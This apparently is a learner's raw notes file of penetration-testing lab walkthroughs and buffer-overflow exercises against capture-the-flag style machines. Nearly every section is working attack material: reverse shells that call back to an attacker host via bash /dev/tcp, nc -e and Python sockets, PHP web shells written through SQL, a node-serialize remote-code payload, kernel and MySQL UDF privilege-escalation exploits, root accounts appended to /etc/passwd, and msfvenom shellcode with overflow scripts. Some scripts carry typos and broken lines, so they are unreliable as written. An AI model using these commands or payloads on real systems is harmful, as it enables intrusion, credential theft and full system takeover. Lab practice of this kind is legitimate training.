>cp etcshadow.txt /etc/shadow
>su rooot
		##no_root_squash/no_all_squash privsc
		##https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe





Mercy
===================================
python3 autorecon.py 10.1.1.69
http://10.1.1.69:8080
http://10.1.1.69:8080/robots.txt
http://10.1.1.69:8080/tryharder/tryharder
		##got txt base64 encoded, and decoded as password
smbmap -H 10.1.1.69
cat enum4linux.txt
		##got 4 user: pleadformercy,qiu,thisisasuperduperlonguser,fluffy
smbclient \\\\192.168.1.111\\qiu -U qiu
password: password
>mask ""
>recurse ON
>prompt OFF
>mget *
>exit
cat .secret/opensesame/config
		##knockd configuration
knock -v 10.1.1.69 159:tcp 27391:tcp 4:tcp
knock -v 10.1.1.69 17301 28504 9999
nmap -Pn --min-rate=10000 10.1.1.69
http://10.1.1.69
http://10.1.1.69/robots.txt
http://10.1.1.69/mercy/
http://10.1.1.69/nomercy/
searchsploit rips
		##rips lfi/RIPS LFI/rips LFI
http://10.1.1.69/nomercy/windows/code.php?file=../../../../../etc/passwd
http://10.1.1.69/nomercy/windows/code.php?file=../../../../../etc/tomcat7/tomcat-users.xml
		##got credz thisisasuperduperlonguser:heartbreakisinevitable
		##got credz fluffy:freakishfluffybunny
http://10.1.1.69:8080/manager
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.1.1.5 LPORT=4141 -f war -o exp.war
		##login and upload
http://10.1..1.69/exp
nc -lvp 4141
>whoami
>ls -lah /home
>su fluffy
password: freakishfluffybunny
>cd /home/fluffy/.private/secret
>cat timelock
http://10.1.1.69/time
>nano timelock
		echo "rooot:`openssl passwd -1 -salt ignite godmode`:0:0:root:/root:/bin/bash" >> /etc/passwd
http://10.1.1.69/time
>su rooot
		##exploit kernel dirtycow
>uname -a
>uname -m
>lsb_release -a
>wget 10.1.1.5/dirtycow
>chmod 775 dirtycow
>echo 0 > /proc/sys/vm/dirty_writeback_centisecs
>back_centisecs
>id
>apt-get update
>apt-get install build-essential
>which gcc
apt-get install gcc-multilib g++-multilib
		##got error broken package
apt-get install aptitude
aptitude install gcc-multilib
		##dirtycow exploit linux kernel CVE-2016-5195
>uname -a
>uname -m
>lsb_release -a
git clone https://github.com/FireFart/dirtycow
gcc -pthread dirty.c -o dcow -lcrypt -static
>wget 10.1.1.5/dcow
>chmod +x dcow
>./dcow
>Password: asd
>su firefart
>echo 0 > /proc/sys/vm/dirty_writeback_centisecs
>id





Joy
===================================
python3 autorecon.py 10.1.1.71
ftp 10.1.1.71
>anonymous
>cd upload
		##directory writeable
>put autorecon.py
wget -m ftp://anonymous:anonymous@10.1.1.71
cat directory
		##abuse ftp lfi ftp local file inclusion
telnet 10.1.1.71 21
>site cpfr /home/patrick/version_control
>site cpto /home/ftp/upload/version_control
ftp://10.1.1.71/upload/version_control
searchsploit proftpd 1.3.5
msfconsole
>search proftpd
>use exploit/unix/ftp/proftpd_modcopy_exec
>set rhost 10.1.1.71
>set sitepath /var/www/tryingharderisjoy
>set rport 80
>set rport_ftp 21
>show payloads
>set paylods
>run
>id
>python -c 'import pty; pty.spawn("/bin/sh")'
>which python
		##python reverse shell
>export RHOST="10.1.1.71";export RPORT=4141;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
nc -lvp 4141
>cd ossec
>cat patricksecretsofjoy
		##got credz patrick:apollo098765
>su patrick
>which socat
		##socat transfer file
nc -lvp 5555 < linpeas.sh
>socat -u TCP:10.1.1.5:5555 STDOUT > linpeas.sh
>bash linpeas.sh
>sudo -l
>sudo /home/patrick/script/test
		##change ../../../../etc/passwd to 777
>ls -lah /etc/passwd
>cp /etc/passwd passwd.bak
>cp newpasswd /etc/passwd
>su rooot
		##ftp can copy as root
telnet 10.1.1.71 21
>site cpfr /home/patrick/script/test
>site cpto /home/ftp/upload/test
echo "/bin/sh" > test
>site cpfr /home/ftp/upload/test
>site cpto /home/patrick/script/test
sudo /home/patrick/script/test
>site cpfr /home/ftp/upload/passwd.bak
>site cpto /etc/passwd
su rooot
		##another vector port tftp open
cat udp_161_snmpwalk.txt
		STRING: "— listen — user tftp — address 0.0.0.0:36969 — secure /home/patrick
tftp 10.1.1.71 36969
>get version_control
		##proftpd 1.3.5 github exploit
		##https://github.com/t0kx/exploit-CVE-2015-3306
python proftpd_exp.py --host 10.1.1.71 --port 21 --path "/var/www/tryingharderisjoy"
http://10.1.1.71/backdoor.php?cmd=id
http://10.1.1.71/backdoor.php?cmd=which python




NullByte
==================================
python3 autorecon.py 10.1.1.72
wget http://10.1.1.72/main.gif
exiftpol main.gif
		##got info kzMb5nVYJw
http://10.1.1.72/kzMb5nVYJw/
hydra -L /home/rockyou.txt -p elite 10.1.1.72 http-post-form "/kzMb5nVYJw/index.php:key=^USER^:invalid"
		##got key elite
sqlmap -r req.txt --dbs --batch
sqlmap -r req.txt --batch -D seth --tables
sqlmap -r req.txt --batch -D seth --dump
sqlmap -r req.txt --batch -D mysql --tables
sqlmap -r req.txt --batch -D mysql -T user -C User,Password --dump
		##got credz root:sunnyvale
http://10.1.1.72/phpmyadmin/
		##phpmyadmin shell
		##query: select "<?php system($_GET['c']);?>" into outfile "/var/www/html/uploads/shell.php"
http://10.1.1.72/uploads/shell.php?c=id
http://10.1.1.72/uploads/shell.php?c=which wget
http://10.1.1.72/uploads/shell.php?c=wget 10.1.1.5/cmd.php
http://10.1.1.72/uploads/cmd.php
		##python reverse shell
		##export RHOST="10.1.1.5";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
nc -lvp 4242
>su ramses
password:omega
>find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
>cat /var/www/backup/readme.txt
>/var/www/backup/procwatch
		##using ps program and abuse PATH
>echo $PATH > path.bak.txt
>PATH=/var/www/backup/:$PATH
>nc 10.1.1.5 5555 > ps
nc -lvp 5555 < ps
		##python reverse shell
>/var/www/backup/procwatch
nc -lvp 4444
>>id
>>cd /root
>>cat proof.txt




GasGlow Smile
====================================
python3 autorecon.py 10.1.1.76
gobuster dir http://10.1.1.76 -w /usr/share/wordlist/../../..2.medium.txt
htp://10.1.1.76/joomla/administrator
joomscan -u http://10.1.1.76/joomla/
git clone https://github.com/D35m0nd142/Joomla-Components-Exploits-Auto-Updating-Scanner
python joomlascan.py --target http://10.1.1.7/joomla/
cewl -h					##error cewl ruby
ruby2.7 -W0 /usr/bin/cewl http://10.1.1.7/joomla/
	##bruteforce it with burp
	##got credz joomla:Gotham
	##login, change template, got reverse shell
>cat /var/www/html/joomla/configuration.php		##joomla configuration	
	##got mysql joomla:babyjoker
>mysql -u joomla -p
>use batjoke; select * from taskforce;
	##got credz rob:???AllIHaveAreNegativeThoughts???
ssh rob@10.1.1.76
>cat Abnerineedyourhelp
	##encode all rot type with this link
rot decode full https://tech.pookey.co.uk/non-wp/rot-decoder.php
	##got cred abner:I33hope99my0death000makes44more8cents00than0my0life0
>su abner
>cat .bash_history
>find / -name "*penguin*" 2>/dev/null
>unzip /var/www/joomla2/administrator/manifests/files/.dear_penguins.zip -d .
>su penguin scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz
>wget 10.1.1.5/pspy
>chmod +x pspy
>./pspy
>chmod "nc -e bash 10.1.1.5 4242" >> SomeoneWhoHidesBehindAMask/.trash_old
nc -lvp 4242



Photographer
====================================
python3 autorecon.py 10.1.1.77
smbmap -H 10.1.1.77
smbclient //10.1.1.77/smbshare
>get mailsent.txt
cat mailsent.txt
		##got credz daisa@photographer.com:babygirl
http://10.1.1.77:8000/admin
		##exploit koken 
		##liblary > content > upload content
		##upload image and temper with burp to get reverse shell
>find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
		##php privesc setuid
>php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
>id
>cat /root/proof.txt



Healthcare
====================================
python3 autorecon.py 10.1.1.78
gobuster dir -u http://10.1.1.78 -w /usr/share/..../directory-list-2.3-big.txt
http://10.1.1.78/openemr/
		##login and observe the request on burp
http://10.1.1.78/openemr/interface/login/validateUser.php?u=admin
http://10.1.1.78/openemr/interface/login/validateUser.php?u=admin'
		##got sql error response
sqlmap -r req.txt --dbs --batch
sqlmap -r req.txt --batch --dbms=mysql -D openemr --tables
sqlmap -r req.txt --batch --dbms=mysql -D openemr -T user --dump
sqlmap -r req.txt --batch --dbms=mysql -D openemr -T user -C id,username,password
		##got credz admin:ackbar medical:medical
		##login
administrator > files > change statement.inc.php
http://10.1.1.78/openemr/sites/default/statement.inc.php
nc -lvp 4141
>su medical
>cd ~
>find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
>cp /usr/bin/healthcare .
>strings healthcare
		##call ifconfig
>echo $PATH
>PATH=~:$PATH
>echo $PATH
>echo "/usr/bin/nc -e /bin/bash 10.1.1.5 4141" > ifconfig
>chmod 777 ifconfig
>./ifconfig
>/usr/bin/healthcheck
nc -lvp 4141



Tiki
====================================
python3 autorecon.py 10.1.1.80
smbclient \\10.1.1.80\Notes
>get Mail.txt
cat Mail.txt
dirb http://10.1.1.80 /usr/share/wordlist/dirbuster/directory-list-2.0-big.txt
http://10.1.1.80/tiki/
		##got credz silky:51lky571k1
		##cve tiki login bypass
		##login 50 times, then login with null password
for i in $(seq 1 60); do echo $i; done
		##login with intruder
		##login again as admin intercept with burp remove password fill with nothing
http://10.1.1.80/tiki/tiki-index.php?page=Credentials
		##got credz silky:Agy8Y7SPJNXQzqA
ssh silky@10.1.1.80
>sudo -l
>sudo su
>id






Fristileaks
====================================
python3 autorecon.py 10.1.1.81
http://10.1.1.81/robots.txt
http://10.1.1.81/fristi
view-source:http://10.1.1.81/fristi
		##got base64file
echo "b64" > b64
base64 -f b64 > file
file file
display file
		##got credz eezeepz:keKkeKKeKKeKkEkkEk
http://10.1.1.81/fristi/upload.php
		##upload shell.php.jpg.php.jpg
http://10.1.1.81/fristi/uploads/shell.php
nc -lvp 4141
>cd /home/eezeepz
>cat notes.txt
>echo "/usr/bin/id; bash -i >& /dev/tcp/10.1.1.5/4242 0>&1" > /tmp/runthis
nc -lvp 4242
>id
>cd ~
>cat *.txt
		##string encoded base64, encode rot 13, reverse string
		##https://codebeautify.org/reverse-string
		##got credz admin:thisisalsopw123 fristigod:LetThereBeFristi!
>su fristigod
>cd ~
>sudo -l
		##(fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
>strings /var/fristigod/.secret_admin_stuff/doCom
>sudo /var/fristigod/.secret_admin_stuff/doCom
		##got error because different user fristi and fristigod
>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash
>id




Development digital.world
=================================
nmap -p- -sS --min-rate 10000 10.1.1.74
http://10.1.1.74/
http://10.1.1.74/html_pages
http://10.1.1.74/development.html
http://10.1.1.74/developmentsecretpage/
http://10.1.1.74/developmentsecretpage/patrick.php?logout=1
		##try login
		##got error /slogin_lib.inc.php
		##https://www.exploit-db.com/exploits/7444 Simple Text-File Login script (SiTeFiLo)
http://10.1.1.74/developmentsecretpage/slog_users.txt
		##got credz
		##intern:12345678900987654321
		##patrick:P@ssw0rd25
ssh patrick@10.1.1.74
		##got error ssh too many authentication failure
ssh patrick@10.1.1.74 -o IdentitiesOnly=yes
ssh patrick@10.1.1.74 -o PubkeyAuthentication=no
		##still got error
ssh intern@10.1.1.74
>?
		##rbash escape
>echo os.system("/bin/bash")
>su patrick
>sudo -l
>sudo /usr/bin/vim
>:set shell=/bin/sh
>:shell
>id





Lord Of The Root
=================================
./autorecon.py 10.1.1.82
ssh root@10.1.1.82
knock -v 10.1.1.82 1 2 3
nmap -p- --min-rate 10000 10.1.1.82
http://10.1.1.82:1337/
http://10.1.1.82:1337/blackgate
view-source:http://10.1.1.82:1337/
		##/978345210/index.php
http://10.1.1.82:1337//978345210/index.php
		##login sql cheat sheet susscess with payload  1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
sqlmap -r req.txt --dbs --batch
sqlmap -r req.txt -D Webapp --batch --dump
		##got credz smeagol:MyPreciousR00t
ssh smeagol@10.1.1.82
>id
>bash linpeas.sh
>cd /SECRET
>md5sum door1/file door2/file door3/file
		##buffer overflow shit I cant
		##https://pfarrside.com/write-ups/lord-of-the-root/
>cat /proc/sys/kernel/randomize_va_space
>gdb -q file
>checksec
>info functions
>r buffer
		##offsite 171
>r buffer+BBBB+NOP*200
		##address NOP on 0xbfd137fc
import struct
from pwn import *
buf = ""
buf += "A"*171
buf += struct.pack("<I", 0xbfd137fc)
buf += "\x90"*1000
buf += asm(shellcraft.i368.linux.sh())
print buf
python x.py > asd
>./file $(cat asd)
		##got Segmentation fault because ASLR
		##bypass ASLR
>for a in {1..1000}; do /SECRET/door2/file $(cat asd);done
#id

		##mysql udf raptor sys_exec privesc
>wget https://www.exploit-db.com/download/46249
>python 46249 --username root --password darkshadow
#id
>cat /etc/mysql/my.cnf
		##user 		= root
		##datadir 	= /var/lib/mysql/
>mysql -u root -p
>use mysql;
		##copy shell in 46246 which 32binary or 64binary
>select binary 0xpasteshell into dumpfile '/usr/lib/mysql/plugin/asd.so';
>create function sys_exec returns int soname 'asd.so';
>select * from mysql.func;
>select sys_exec('cp /bin/sh /tmp/asd; chown root:root /tmp/asd; chmod +s /tmp/asd')
>/tmp/asd
#id
		##mysql udf raptor do_system privesc
wget https://raw.githubusercontent.com/1N3/PrivEsc/master/mysql/raptor_udf2.c
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o asd.so raptor_udf2.o -lc
mysql -u root
>use mysql;
>create table asd(line blob);
>insert into asd values(load_file('/tmp/asd.so'));
>select * from asd into dumpfile '/usr/lib/mysql/plugin/asd.so';
>create function do_system returns integer soname 'asd.so';
>select * from mysql.func;
>select do_system("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash");
>/tmp/rootbash -p
#id
		##linux kernel ubuntu linux 3.19.0-42 exploit kernel privesc
>uname -a
		##linux LordOfTheRoot 3.19.0-25-generic 14.04 ubuntu
searchsploit linux 3.19
search google "exploit-db linux 3.19.0"
>wget https://www.exploit-db.com/download/39166
>mv 39166 39166.c
>gcc 39166
>./a.out
#id



Webdeveloper
==========================================
python3 autorecon.py 10.1.1.83
dirb http://10.1.1.83
http://10.1.1.83/ipdata
wget http://10.1.1.83/ipdata/analyze.cap
wireshark analyze.cap
		##got credz webdeveloper:passwd
wpscan --url http://10.1.1.83 -e u,vp,vt,cb,dbe
http://10.1.1.83/wp-admin
		##install plugin file manager and upload shell
nc -lvp 4141
		##find python to upgrade shell
>find / -name "*python*" -executable -type f 2>/dev/null
>/usr/bin/python3.6 -c 'import pty;pty.spawn("/bin/bash")'
>su webdeveloper
>sudo -l
		##(root)	/usr/sbin/tcpdump
		##tcpdump privesc
>echo $'id\ncat /etc/shadow' > /tmp/.test
>echo \
>cat /root/flag.txt >> /tmp/.test
>echo \
>php /var/www/html/wp-content/uploads/rev/php >> /tmp/.test
>chmod +x /tmp/.test
>sudo -u root tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
nc -lvp 4141
>id
		##lxd privesc
ssh webdeveloper@10.1.1.83
>id
find /home -name "alphine.tar.gz" 2>/dev/null
python -m SimpleHTTPServer 80
>wget http;//10.1.1.5/alphine.tar.gz . 
>which lxd
>which lxc
>lxc image import alphine.tar.gz --alias myimage
>lxc init myimage ignite -c security.privileged=true
		##got error & need to init lxd
>lxd init
		##enter to the end
>lxc init myimage ignite -c security.privileged=true
>lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
>lxc start ignite
>lxc exec ignite /bin/sh
>id
>cd /mnt/root/root
>ls
>cat flag.txt
>cat /mnt/root/etc/sudoers
>echo "%webdeveloper ALL=(ALL:ALL) ALL" >> /mnt/root/etc/sudoers
ssh webdeveloper@10.1.1.83
>sudo -l
>sudo /bin/bash



Zico 2
====================================
python3 autorecon.py 10.1.1.84
dirb http://10.1.1.84
http://10.1.1.84/view.php?page=tools.html
http://10.1.1.84/view.php?page=../../../../../etc/passwd
		##found LFI
http://10.1.1.84/dbadmin/test_db.php
		##login with default password admin:admin
		##create table with php rce
http://10.1.1.84/view.php?page=../../../../usr/databases/test
nc -lvp 4141
>id
>cd /home/zico
>cat wordpress/wp-config.php
		##got credz zico:sWknoQKJbhsIIQbsjbqs
su zico@10.1.1.84
>sudo -l
		##zip privesc
>sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
		##find privesc SUID
>find /tmp -exec /bin/sh -i \;
		##kernel privesc
>uname -a
>Linux Zico 3.2.0-23-generic #36-Ubuntu x86_64 GNU/Linux
searchsploit linux 3.2.0-23
searhsploit -m 33589
>gcc vnik.c -O2 -o vnik
>./vnik
>id




Temple Of Doom
======================================
python3 autorecon.py 10.1.1.85
dirb http://10.1.1.85:666
http://10.1.1.85:666
http://10.1.1.85:666
		##got error node-serialize/lib/serialize.js
		##got user /home/nodeadmin
set cookie to {"username":"Admin","csrftoken":"u32t4o3tb3gg431fs34ggdgchjwnza0l=","Expires=":"Friday, 13 Oct 2018 00:00:00 GMT"}
		##then got success message
		##exploit node serialize node-serialize nodejs rce
set cookie to {"username":"Admin"} encode with base64 and still got success message
payload= {"username":"_$$ND_FUNC$$_function(){return require('child_process').execSync('ls -l /',(e,out,err)=>{console.log(out);}); }()"}
rev payload= {"username":"_$$ND_FUNC$$_function(){return require('child_process').execSync('bash -i >& /dev/tcp/10.1.1.5/4141 0>&1',(e,out,err)=>{console.log(out);}); }()"}
>id
>bash linpeas.sh
>ps -aux | grep fireman
		##/usr/bin/ss-manager
		##exploit shadowshock ss-manager
		##https://www.exploit-db.com/exploits/43006
>netstat -lntpu
		##udp	127.0.0.1:8839
		##everytime found udp 8839 might be shadowshock service
>nc -u 127.0.0.1 8839
>add: {"server_port":8003, "password":"test", "method":"||touch /tmp/evil||"}
>ls -la /tmp
		##evil file created as fireman
>nc -u 127.0.0.1 8839
>add: {"server_port":8003, "password":"test", "method":"||bash -i >& /dev/tcp/10.1.1.5/5252 0>&1||"}
nc -lvp 5252
>id
>bash linpeas.sh
>sudo -l
		##(ALL) NOPASSWD: /usr/sbin/tcpdump
		##tcpdump privesc
>echo "nc 10.1.1.5 5151 -e /bin/sh" > /tmp/rev
>chmod +x /tmp/rev
>sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/rev -Z root
nc -lvp 5151
>id
>cat /root/flag.txt





Immirtil exploit gd-image
========================================
gd-jpeg v1.0 (using IJG JPEG v62), quality = 90
		##exploit imagecreatefromjpeg()
https://asdqw3.medium.com/remote-image-upload-leads-to-rce-inject-malicious-code-to-php-gd-image-90e1e8b2aada
	#create none image to gd-image format
php gd.php image.jpg image-gd.php		#https://gist.githubusercontent.com/asdqwe3124/e63eba35dc8e6976af97f1a9348b277b/raw/82acda6b4f1e9c1ab8a6012e5469368fb351b985/gd.php
	#inject payload to image
python gd-jpeg.py image-gd.php '<?php phpinfo()?>' image-gd-poc.jpg		#https://github.com/dlegs/php-jpeg-injector
	#try recreate gd-image
php gd.php image-gd-poc.jpg upload.jpg 90
nano upload.jpg
hexeditor upload.jpg
	#the problem is image compressed with quality 90
	#try with gd-gif, same method create gd-gif format
	#exploit imagecreatefromgif()
php gd-gif.php image.gif gd-image.gif	#https://gist.githubusercontent.com/asdqwe3124/e63eba35dc8e6976af97f1a9348b277b/raw/82acda6b4f1e9c1ab8a6012e5469368fb351b985/gd-gif.py
	#inject payload
gd-gif.py gd-image.gif '<?php phpinfo()?>' gif-gd-poc.gif
	#recreate gif
php gd-gif.php gif-gd-poc.gif upload.gif
nano upload.gif
hexeditor upload.gif
	#upload, download and validate
curl https://web/upload/upload.gif
	#upload, intercept with burp, change extention to php

		##exploit imagecopyresampled() and imagecopyresized()
https://blog.safebuff.com/2016/06/17/Bypass-imagecopyresampled-and-imagecopyresized-generate-PHP-Webshell/
php jpg_payload.php image.jpg
nano payload_image.jpg
hexeditor payload_image.jpg
	#validate
php gd.php payload_image.jpg upload.jpg
nano upload.jpg
	#upload, intercept with burp, change extention to php, and download





Into Stack overflow
====================================
login level0:level0
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
git clone https://github.com/Gallopsled/pwntools
pip install --upgrade --editable ./pwntools
gdb -q ./levelOne
>pdisass main
		##break at cmp instruction
>b *main+134
>r AAAAAAAAAAAAAAAAAAAAAACCCC
>x/s $ebp-0x20
		##got value CCCC
--------------
su level2
gdb -q ./levelTwo
>info functions
>pdisass spawn
		##spawn function at 0x565561e9
./levelTwo $(python -c 'print "A"*36+"\xe9\x61\x55\x56")
--------------
su level3
gdb -q ./levelThree
>checksec
>b *overflow+72
>r AAAAAAAAAAAABBB
		##offsite 28
>x/ws 0xffffd260		##staarting buffer
/.levelThree $(python -c 'print buff+'\x60\xd2\xff\xff'+'\x90'*100+shell)
		##root setuid 0 shell
"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"
--------------
su level4
		## ret to libc rettolibcf
gdb -q levelFive
>b *overflow+72
>r AAAAAAAAAAAAAAAABBB
>c
		##offsite 16
>p system
>searchmem /bin/sh
(python -c 'print buf+system+AAAA+bash_addr; cat) | ./levelFive
--------------
level4 exploit

import struct
from pwn import *

rshell="\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"
buf = ""
buf += "A"*16
buf += struct.pack('<I', 0xffffd370)	#address NOP
buf += "\x90"*200
#buf += rshell
buf += asm(shellcraft.i386.linux.setreuid())
buf += asm(shellcraft.i386.linux.sh())

p = process("./levelFive")
p.sendline(buf)
p.interactive()





Assembly course
====================================
gdb ./Simpledemo
>list 1				##see the code
>run asd
>dissasamble main	##see gets() call and puts() call
>break 8			##break to add function
>run 10 20
>info registers
>x/10xb 0xbffff450	##print stack bytes
>x/10xw 0xbffff450	##print stack words
>s					##stepping next list line
>c 					##continue to the end

https://www.youtube.com/watch?v=RvvRO_gWYIg
http://www.securitytube.net/groups?operation=view&groupId=5





Buffer Overflow The Cyber Mentor
====================================
download vulnserver
disable realtiime virus protection and defender firewall
run as administrator
attach on imunity dibugger
choose open on immunity debugger, restart by (ctrl +F2) and (F9) to start
		##fuzzing
which generic_send_tcp
generic_send_tcp 10.1.1.87 9999 trun.spk 0 0
s_readline();
s_string("TRUN ");
s_string_variable("FUZZ");
	##TRUN is vulnerable
python fuzz.py
#!/usr/bin/python
import sys, socket
from time import sleep
buffer = 'A'+100
wile True:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('10.1.1.87',9999))
		s.send(('TRUN /.:/'+buffer))
		s.close()
		sleep(1)
		buffer = buffer+'A'*100
	exept:
		print "Fuzzring crash at %s bytes" % str(len(buffer))
		sys.exit()
		##find offset
		##try overide EIP with BBBB
		##find bad characters
google bachars
copy and send it after EIP
s.send(('TRUN /.:/'+buffer+badchar))
in immunity debugger right click ESP -> follow in dump
bad characters can be identified as strange hex that are not it order with bad chars variable
screenshot hex in immunity debugger and zoom
		##find right module
download mona module
save it in C:\Program/ \File/ \(x86)\Immunity/ \Inc\Immunity /Debugger\PyCommand\mona.py
!mona modules
	find dll application (essfunc.dll)
JMP ESP (as pointer) is FFE4
!mona find -s "\xff\xe4" -m essfunc.dll
!mona jmp -r ESP -m "essfunc.dll"
	results: 0x625011af
click blue arrow (expression to follow) -> find "625011af" -> press F2 (set breakpoint)
buf = "A"*2003+ struct.pack("<I", 0x625011af)
		##write shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.1.1.5 LPORT=4242 EXITFUNC=thread -f c -a x86 -b "\x00"
buf = "A"*2003 + ret + "\x90"*32 + shell
nc -lvp 424259.125
>whoami
		##exercise
generic_send_tcp 10.1.1.87 9999 trun.spk 0 0
python fuzz.py
crash at 2300 and 3000 still crash
offset at 2003
esp can be flooded
!mona jmp -r ESP
JMP ESP 0x62501205 (ASCII available and security off)
msfvenom -p windows/shell_bind_tcp LPORT=4242 EXITFUNC=thread -f c -a x86 -b "\x00"
buff=offset+eip+nop+shell+'C'*(len(buffer)-len(shell)-len(nop)-len(eip))
nc 10.1.1.87 4242






dostackbufferoverflowgood
===================================
##fuzzing
import sys,socket,time
buf = 'A'*10
while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("10.10.192.80", 31337))
        s.send(buf)
		s.recv(4098)
        s.close()
		print "Se d buf size of %s bytes" % str(len(buf))
		time.sleep(2)
		buf=buf+'A'*10
	except:
		print "\nCrash at %s bytes" % str(len(buf))
		sys.exit()
##exploit (use jmp esp)
buf = 'A'*146
eip = struct.pack("<I",0x080416bf)
nop="\x90"
msfvenom -p windows/exec cmd=calc.exe -b '\x00\x0a' exitfunc=thread -f c
shell=("") #msfvenom -p windows/shell_reverse_tcp lhost=10.10.249.18 lport=4242 -b '\x00\x0a' exitfunc=thread -f c
buffer=buf+eip+nop+shell
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.192.80", 31337))
s.send(buf)
s.recv(4098)
s.close()



tryhackme oscp.exe buffer overflow
======================================
##badchar generator
for x in range (1,256):
	print ("\\x"+"{:02x}".format(x),end='')
print()
python3 badchargen.py
import socket
ip = '10.10.150.224'
port = 1337
prefix = 'OVERFLOW1 '
overflow = 'A'*offset
offset = 1978
retn = BBBB
badchar = ()
buffer = prefix + overflow + retn + badchar
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,port))
s.send(bytes(buffer + "\r\n","latin-1"))
python3 badchar.py
!mona bytearray -b "\x00"
!mona compare -f C:\Program Files\Immunity Inc\Immunity Debugger\bytearray.bin -a 01A4FA30 ##esp address
	##got result badchar "\x00\x07\x08\x2e\x2f\xa0\xa1"
	##byte \x00 and \xa0 mostly known as bad char for machine code (\x00 end of string)(\xa0 jump instructuion idk i cant remember)
	##cause next byte might be currupted so we can assume that actual badchars is "\x00\x07\x2e\xa0"
!mona bytearray -b "\x00\x07\x2e\xa0"
	##remove badchar in badchar.py as well
python3 badchar.py
!mona compare -f bytearraybin -a 0192fa30
	#got another badchar \x01
!mona bytearray -b "\x00\x01\x07\x2e\xa0"
python3 badchar.py
!mona compare -f bytearraybin -a 0192fa30
	##no arror
msfvenom -p windows/exec cmd=calc.exe -b '\x00\x01\x07\x2e\xa0' exitfunc=thread -f c
!mona jmp -r esp -cpb "\x00\x01\x07\x2e\xa0"
buffer = prefix+overflow+retn+nop+payload+padding





tryhackme SLMail Buffer Overflow
====================================
net start slmail
	##fuzzing
import sys,socket,time
buf = 'A'*10
while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("10.10.207.164", 110))
        s.send("USER asd\r\n")
		s.recv(4098)
		s.send("PASS "+buf+"\r\n")
        s.close()
		print "Se d buf size of %s bytes" % str(len(buf))
		time.sleep(2)
		if len(buf)<100:
			buf=buf+'A'*10
		elif len(buf)<1000:
			buf=buf+'A'*100
		elif len(buf)<10000:
			buf=buf+'A'*1000
		elif len(buf)<100000
			buf=buf+'A'*10000
		else:
			print "buf over 100000 bytes"
			buf=buf+'A'*100000
	except:
		print "\nCrash at %s bytes" % str(len(buf))
		sys.exit()
	##offset
2606
	#badchar
!mona bytearray -b "\x00"
!mona compare -f bytearray.bin -a 0192fa30
\x00\x0a\x0d
	##find right module
!mona modules
SLMFC.DLL
!mona find -s "\xff\xe4" -m SLMFC.DLL -cpb "\x00\x0a\x0d"
0x5f4b5663
	##find and write exploit
set processor
msfvenom -p windows/exec cmd=calc.exe -f c -b '\x00\x0a\x0d' exitfunc=thread -e x86
msfvenom -p windows/shell_reverse_tcp lhost=10.10.249.18 lport=4242 -b '\x00\x0a\x0d' exitfunc=thread -f c -e x86/shikata_ga_nai
import sys,socket,struct
buf='A'*2606
eip=struct.pack("<I",0x5f4a358f)
nop='\x90'*8
shell=("")
buffer=buf=eip=nop+shell
s.socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.74.197",110))
s.recv(4098)
s.send("USER asd\r\n")
s.recv(4098)
s.send("PASS "+buffer+"\r\n")
s.close()
print "done"

tasklist -v | findstr /I /C "calc"
 




Brainstorm Tryhackme
===================================
nmap -p- -Pn -Ss 10.10.157.29 -o nmap
ftp 10.10.157.29 21
>dir
>cd chatserver
>binary				#dont fcking forget to change to binary transfer mode
>get chatserver.exe
>get essfunc.dll
	## file windows
powershell
$client = new-object System.Net.WebClient
$client.DownloadFile("http://10.1.1.88/chatserver.exe","C:\Users\admin\chatserver.exe")
$client.DownloadFile("http://10.1.1.88/essfunc.dll","C:\Users\admin\essfunc.dll")
	##fuzzing
while True:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((""10.1.1.87",9999))
		s.recv(4098)
		s.send(str(len(buf))+"0")
		s.recv(4098)
		s.send(buf)
		s.close()
		time.sleep(2)
		if len(buf)<100:
			buf=buf+'A'*10
		elif len(buf)<1000:
			buf=buf+'A'*100
		else
			buf=buf+'A'*1000
		print "sned %s bytes" % (len(buf))
	except:
		print "gagal"
		sys.exit()
	##offset 
2012
